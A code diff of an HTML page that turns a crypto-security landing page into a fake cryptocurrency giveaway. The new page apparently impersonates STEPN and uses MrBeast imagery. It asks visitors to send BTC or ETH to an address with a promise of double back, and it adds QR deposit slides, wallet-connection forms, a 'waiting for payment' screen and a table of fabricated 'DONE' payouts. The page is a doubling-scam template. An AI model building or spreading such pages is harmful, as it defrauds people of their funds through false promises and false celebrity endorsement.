@@ -4,18 +4,25 @@
 	<meta charset="UTF-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link rel="stylesheet" href="css/style.min.css" type="text/css">
+	<link rel="stylesheet" href="css/style.min.css?_v=20220817103507" type="text/css">
 	<title>Гланая</title>
 </head>
 	<body>
-		<header class="header">
-	<div class="container header__body">
-		<a href="/" class="header__logo" style="order: 1;">
-			<img src="img/logo.png" alt="">
-		</a>
-		<div class="header__menu" style="order: 2;">
-			<a href="#" class="header-register">REGISTER</a>
-			<div class="header-burger" id="burger">
+		<div class="main">
+			<header class="header">
+	<div class="container">
+		<div class="header__body">
+			<div class="header__logo">
+				<img src="img/stepn.png" alt="">
+			</div>
+			<div class="header__menu" id="modal">
+				<ul class="header__list">
+					<li class="header__connect"><a href="#">CONNECT WALLET</a></li>
+					<li class="header__link"><a href="#">WHITEPAPER</a></li>
+					<li class="header__link"><a href="#">MRBEAST</a></li>
+				</ul>
+			</div>
+			<div class="header__mobile" id="burger">
 				<span></span>
 				<span></span>
 				<span></span>
@@ -23,168 +30,442 @@
 		</div>
 	</div>
 </header>
-		<div class="main">
-			<div class="main__title">
-				the world's first defender for cryptocurrency
-				wallets and sessions for cryptocurrency
-				exchanges
+<div class="overlay" id="overlay"></div>
+			<div class="container">
+				<div class="main__buttons">
+					<a href="#">
+						<img src="img/giveway1.png" alt="">
+					</a>
+					<a href="#">
+						<img src="img/giveway2.png" alt="">
+					</a>
+				</div>
 			</div>
-			<img src="img/main.png" alt="" class="main__img">
-			<a href="#" class="btn main-button">REGISTER</a>
 		</div>
-		<div class="second">
-			<div class="second__title">HE BLOCKCHAIN ECOSYSTEM IS <br> UNDER ATTACK – <b>$1.2 BILLION <br> SINCE 2017</b></div>
-			<div class="second__column">
-				<div class="second__column-block">
-					<img src="img/security.png" alt="security" class="second__column-img">
-					<span class="line-13px"></span>
-					Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do
-					<span class="line-99px"></span>
+		<div class="slidefirst">
+			<div class="container">
+				<div class="slider">
+					<div class="mrbeast">
+						<img src="img/mrbeast.png" alt="">
+					</div>
+					<div class="slider__paggination" data-id="1">
+						<span class="is_active"></span>
+						<span></span>
+						<span></span>
+					</div>
+					<div class="slider__body" data-id="1">
+						<div class="slider__slide slide-1" data-id="1">
+							<div class="slider__qr">
+								<img src="img/qrcode1.png" alt="">
+							</div>
+							<div class="slider__text">
+								<div class="slider__img">
+									<img src="img/eth.png" alt="">
+								</div>
+								<p>190 734 ETH already sent to participants! <br>
+								<span style="color: #60FB9D;">Hurry up and take part in the giveaway!</span></p>
+								<p class="slider__p2">You can send THE to the following address:</p>
+								<p style="cursor: pointer;" class="slider__connect" data-id="1">Connect wallet</p>
+							</div>
+						</div>
+						<div class="slider__slide slide-2 is_inactive-slide" data-id="1">
+							<div class="slider-2__title">Chose you wallet</div>
+							<form action="/" class="slider-form" data-id="1">
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="2" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+							</form>
+						</div>
+						<div class="slider__slide slide-3 is_inactive-slide" data-id="1">
+							<div class="loading bar">
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+						  </div>
+						  <div class="slider-3__title">Waiting for the payment…</div>
+						  <div class="slider-3__subtitle">Once we receive your transaction, we will
+							immediately send the requested amount
+							back to you.</div>
+						</div>
+					</div>
 				</div>
-				<div class="second__column-block">
-					<img src="img/done.png" alt="done">
-					Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do
-					<span class="line-99px"></span>
+
+			</div>
+		</div>
+		<div class="info">
+			<div class="container">
+				<div class="row row-cols-lg-4 row-cols-sm-2 row-cols-1 info-blocks">
+					<div class="col">
+						<div class="info-block__body">
+							<div class="info-block__img">
+								<img src="img/icons/wallet.png" alt="">
+							</div>
+							<div class="info-block__p">To participate, you must
+								have a working wallet with
+								the desired amount.</div>
+						</div>
+					</div>
+					<div class="col">
+						<div class="info-block__body">
+							<div class="info-block__img">
+								<img src="img/icons/arrows.png" alt="">
+							</div>
+							<div class="info-block__p">Send the allowed number of
+								coins to the special address
+								below.</div>
+						</div>
+					</div>
+					<div class="col">
+						<div class="info-block__body">
+							<div class="info-block__img">
+								<img src="img/icons/check.png" alt="">
+							</div>
+							<div class="info-block__p">After receiving your funds,
+								we will immediately send
+								back according to the rules.</div>
+						</div>
+					</div>
+					<div class="col">
+						<div class="info-block__body">
+							<div class="info-block__img">
+								<img src="img/icons/gift.png" alt="">
+							</div>
+							<div class="info-block__p">You can only take part in
+								our giveaway once, hurry
+								up!</div>
+						</div>
+					</div>
 				</div>
-				<div class="second__column-block">
-					<img src="img/gear.png" alt="gear">
-					Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do
+				<div class="info__arrow">
+					
 				</div>
 			</div>
-			<a class="second__button" href="#">REGISTER</a>
+		</div>
+		<div class="video">
+			<div class="container">
+				<div class="video__title">Video instruction</div>
+				<div class="video__subtitle">The video shows the instructions for use</div>
+				<div class="video__iframe">
+					<iframe width="560" height="315" src="https://www.youtube.com/embed/DfbiyNMtl1k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+				</div>
+				<div class="video__button btn">
+					<a href="#">
+						CONNECT WALLET
+					</a>
+				</div>
+			</div>
 		</div>
 		<div class="about">
 			<div class="container">
-				<div class="about__title">
-					HE BLOCKCHAIN ECOSYSTEM IS UNDER ATTACK – $1.2 BILLION SINCE 2017
+				<div class="about__title">About giveaway</div>
+				<div class="about__p">
+					We believe that BTC & ETH will make the world more fair. To speed up
+				 process of cryptocurrency mass adoption, we decided to run
+				00 BTC & 50 000 ETH giveaway for all crypto holders!
 				</div>
-				<div class="about__container">
-					<img src="img/defence.png" alt="defence">
-					<div>We offer a reliable solution to this problem. <br>
-						Our system does not allow intruders to get into your money.
-						With the help of excellent protection, we offer our users a safe world in which you will not worry about your money</div>
+				<div class="about__img">
+					<img src="img/icons/lightning.png" alt="lightning">
 				</div>
-				<a href="#" class="btn about__button">REGISTER</a>
+				<div class="about__title">How to participate?</div>
+				<div class="about__p">
+					To participate you just need to send from (0.1 BTC to 30 BTC) or (0.5 ETH to 500 ETH)
+					to the contribution address and we will immediately send you back
+					(0.2 BTC to 60 BTC) or (1 ETH to 1 000 ETH) (x2) to the address you sent it from
+				</div>
+				<div class="about__img">
+					<img src="img/icons/lightning.png" alt="lightning">
+				</div>
+				<div class="about__title">About giveaway</div>
+				<div class="about__p">
+					In order to calculate your prize, you can use the built-in calculator on our website
+				</div>
 			</div>
 		</div>
-		<div class="grid">
+		<div class="rules">
+			<div class="rules__title">RULES</div>
+			<div class="rules__subtitle">Follow the rules to participate</div>
+			<div class="rules__block">
+				If you send&nbsp&nbsp&nbsp1+ ETH&nbsp&nbsp&nbspyou will get&nbsp&nbsp&nbsp2+ ETH&nbsp&nbsp&nbspback
+			</div>
+			<div class="rules__block">
+				If you send&nbsp&nbsp&nbsp2+ ETH&nbsp&nbsp&nbspyou will get&nbsp&nbsp&nbsp3+ ETH&nbsp&nbsp&nbspback
+			</div>
+			<div class="rules__block">
+				If you send&nbsp&nbsp&nbsp3+ ETH&nbsp&nbsp&nbspyou will get&nbsp&nbsp&nbsp4+ ETH&nbsp&nbsp&nbspback
+			</div>
+			<div class="rules__block">
+				If you send&nbsp&nbsp&nbsp4+ ETH&nbsp&nbsp&nbspyou will get&nbsp&nbsp&nbsp5+ ETH&nbsp&nbsp&nbspback
+			</div>
+			<div class="rules__block">
+				If you send&nbsp&nbsp&nbsp5+ ETH&nbsp&nbsp&nbspyou will get&nbsp&nbsp&nbsp6+ ETH&nbsp&nbsp&nbspback
+			</div>
+			<div class="rules__button btn">
+				<a href="#">CONNECT WALLET</a>
+			</div>
+		</div>
+		<div class="claim">
+			<div class="claim__img">
+				<img src="img/coin.png" alt="" width="256px">
+			</div>
+			<div class="claim__btn btn"><a href="#">CLAIM</a></div>
+		</div>
+		<div class="slidesecond">
 			<div class="container">
-				<div class="grid-lables row row-cols-sm-2 row-cols-1">
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label1.png" alt="">
-							<p>Two Arrested for Alleged Conspiracy to Launder $4.5 Billion in Stolen Cryptocurrency</p>
-						</div>
+				<div class="slider">
+					<div class="slider__paggination" data-id="2">
+						<span class="is_active"></span>
+						<span></span>
+						<span></span>
 					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label2.png" alt="">
-							<p>Illicit crypto wallet hold over $25B as hacks, thefts mushroom</p>
+					<div class="slider__body" data-id="2">
+						<div class="slider__slide slide-1" data-id="2">
+							<div class="slider__qr">
+								<img src="img/qrcode1.png" alt="">
+							</div>
+							<div class="slider__text">
+								<div class="slider__img">
+									<img src="img/eth.png" alt="">
+								</div>
+								<p>190 734 ETH already sent to participants! <br>
+								<span style="color: #60FB9D;">Hurry up and take part in the giveaway!</span></p>
+								<p class="slider__p2">You can send THE to the following address:</p>
+								<p style="cursor: pointer;" class="slider__connect" data-id="2">Connect wallet</p>
+							</div>
 						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label3.png" alt="">
-							<p>More than $1.2 Billion was stolen from crypto wallets in February</p>
+						<div class="slider__slide slide-2 is_inactive-slide" data-id="2">
+							<div class="slider-2__title">Chose you wallet</div>
+							<form action="/" class="slider-form" data-id="2">
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="2" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+								<label>
+									<input type="radio" value="1" name="select">
+									<div class="slider-input__body">
+										
+									</div>
+								</label>
+							</form>
 						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label4.png" alt="">
-							<p>Feds seize $3.6 billion in bitcoin stolen from Bitfinex hack</p>
-						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label5.png" alt="">
-							<p>How a Young Couple Failed to Launder Billions of Dollars in Stolen Bitcoin</p>
-						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label6.png" alt="" style="max-width: 220px;">
-							<p>Hackers steal $80 mn in crypto, platform begs them to return funds</p>
-						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label7.png" alt="">
-							<p>Hackers Steal Bitcoin, Crypto Worth $36 Million from Retirement Accounts</p>
-						</div>
-					</div>
-					<div class="col">
-						<div class="grid__block__body">
-							<img src="img/label8.png" alt="">
-							<p>Scammers Now Taking to Social Media to Steal Bitcoins</p>
-						</div>
-					</div>
-				</div>
-				<div class="grid-videos">
-					<div class="box1">
-						<div class="box__body">
-							<img src="img/play.svg" alt="">
-						</div>
-					</div>
-					<div class="box2">
-						<div class="box__body">
-							<img src="img/play.svg" alt="">
-						</div>
-					</div>
-					<div class="box3">
-						<div class="box__body">
-							<img src="img/play.svg" alt="">
+						<div class="slider__slide slide-3 is_inactive-slide" data-id="2">
+							<div class="loading bar">
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+								<div></div>
+						  </div>
+						  <div class="slider-3__title">Waiting for the payment…</div>
+						  <div class="slider-3__subtitle">Once we receive your transaction, we will
+							immediately send the requested amount
+							back to you.</div>
 						</div>
 					</div>
 				</div>
 			</div>
+			<p class="stepn">STEP'N</p>
 		</div>
-		<div class="aboutus container">
-	<div class="aboutus__title"><b>ABOUT US</b></div>
-	<div class="aboutus__video">
-		<img src="img/play.svg" alt="">
-	</div>
-	<div class="aboutus__text">
-		<p>Every day our team works on the security
-			of your personal funds by keeping in touch with
-			Users <b>24\7</b></p>
-		<p>You can be sure that your funds will be protected
-			from intruders</p>
-	</div>
-</div>
-		<footer class="footer">
-	<div class="container footer__body">
-		<div class="footer__logo">
-			<img src="img/logo-white.png" alt="">
+		<div class="backers">
+			<div class="backers__title">OUR BACKERS</div>
+			<div class="backers__list">
+				<img src="img/backers.png" alt="">
+			</div>
 		</div>
-		<a href="#" class="footer__button btn">
-			REGISTER
-		</a>
-		<div class="footer__links">
-			<a href="#">
-				<img src="img/instagram.png" alt="">
-			</a>
-			<a href="#">
-				<img src="img/telegram.png" alt="">
-			</a>
+		<div class="table">
+			<div class="table__title">Bonus transactions</div>
+			<div class="container">
+				<div class="table__body">
+					<div class="table__titles">
+						<div class="table__t-txhash">TXHASH</div>
+						<div class="table__t-block">BLOCK</div>
+						<div class="table__t-from">FROM</div>
+						<div class="table__t-to">TO</div>
+						<div class="table__t-value">VALUE</div>
+						<div class="table__t-fee">FEE</div>
+						<div class="table__t-status">STATUS</div>
+					</div>
+					<div class="table__row">
+						<div class="table__txhash">
+							Asdaw2qdasdacxz
+						</div>
+						<div class="table__block">9999</div>
+						<div class="table__from">
+							<p>Asdaw2qdasdacxz<p>
+							<p>Asdaw2qdasdacxz<p>	
+						</div>
+						<div class="table__to">
+							<div class="table__cell">
+								<p>Asdaw2qdasdacxz<p>
+								<p>Asdaw2qdasdacxz<p>
+							</div>
+						</div>
+						<div class="table__value">
+							<p>1.024646 BTC</p>
+							<p>1.024646 BTC</p>
+						</div>
+						<div class="table__fee">0.00002 BTC</div>
+						<div class="table__status">DONE</div>
+					</div>
+					<div class="table__row">
+						<div class="table__txhash">
+							Asdaw2qdasdacxz
+						</div>
+						<div class="table__block">9999</div>
+						<div class="table__from">
+							<p>Asdaw2qdasdacxz<p>
+							<p>Asdaw2qdasdacxz<p>	
+						</div>
+						<div class="table__to">
+							<div class="table__cell">
+								<p>Asdaw2qdasdacxz<p>
+								<p>Asdaw2qdasdacxz<p>
+							</div>
+						</div>
+						<div class="table__value">
+							<p>1.024646 BTC</p>
+							<p>1.024646 BTC</p>
+						</div>
+						<div class="table__fee">0.00002 BTC</div>
+						<div class="table__status">DONE</div>
+					</div>
+					<div class="table__row">
+						<div class="table__txhash">
+							Asdaw2qdasdacxz
+						</div>
+						<div class="table__block">9999</div>
+						<div class="table__from">
+							<p>Asdaw2qdasdacxz<p>
+							<p>Asdaw2qdasdacxz<p>	
+						</div>
+						<div class="table__to">
+							<div class="table__cell">
+								<p>Asdaw2qdasdacxz<p>
+								<p>Asdaw2qdasdacxz<p>
+							</div>
+						</div>
+						<div class="table__value">
+							<p>1.024646 BTC</p>
+							<p>1.024646 BTC</p>
+						</div>
+						<div class="table__fee">0.00002 BTC</div>
+						<div class="table__status">DONE</div>
+					</div>
+					<div class="table__row">
+						<div class="table__txhash">
+							Asdaw2qdasdacxz
+						</div>
+						<div class="table__block">9999</div>
+						<div class="table__from">
+							<p>Asdaw2qdasdacxz<p>
+							<p>Asdaw2qdasdacxz<p>	
+						</div>
+						<div class="table__to">
+							<div class="table__cell">
+								<p>Asdaw2qdasdacxz<p>
+								<p>Asdaw2qdasdacxz<p>
+							</div>
+						</div>
+						<div class="table__value">
+							<p>1.024646 BTC</p>
+							<p>1.024646 BTC</p>
+						</div>
+						<div class="table__fee">0.00002 BTC</div>
+						<div class="table__status">DONE</div>
+					</div>
+					<div class="table__row">
+						<div class="table__txhash">
+							Asdaw2qdasdacxz
+						</div>
+						<div class="table__block">9999</div>
+						<div class="table__from">
+							<p>Asdaw2qdasdacxz<p>
+							<p>Asdaw2qdasdacxz<p>	
+						</div>
+						<div class="table__to">
+							<div class="table__cell">
+								<p>Asdaw2qdasdacxz<p>
+								<p>Asdaw2qdasdacxz<p>
+							</div>
+						</div>
+						<div class="table__value">
+							<p>1.024646 BTC</p>
+							<p>1.024646 BTC</p>
+						</div>
+						<div class="table__fee">0.00002 BTC</div>
+						<div class="table__status">DONE</div>
+					</div>
+				</div>
+			</div>
 		</div>
-		<a href="#" class="footer__button btn">
-			CONTACT US
-		</a>
-	</div>
-</footer>
-<div class="empty"></div>
-
-<div class="overlay" id="overlay" style="display: none;"></div>
-<div class="modal" id="modal" style="top: -300vh;">
-	<div class="modal__body">
-		<div class="modal__title">Меню</div>
-		<ul class="modal__list">
-			<li><a href="/">Главная</a></li>
-			<li><a href="/lk.html">Страница 1</a></li>
-			<li><a href="/prof.html">Страница 2</a></li>
-		</ul>
-	</div>
-</div>
-		<script src=" /js/app.min.js"></script>
+		<div class="last">All Rights Reserved</div>
+		
+		<script src="js/app.min.js?_v=20220817103507"></script>
 	</body>
 </html>
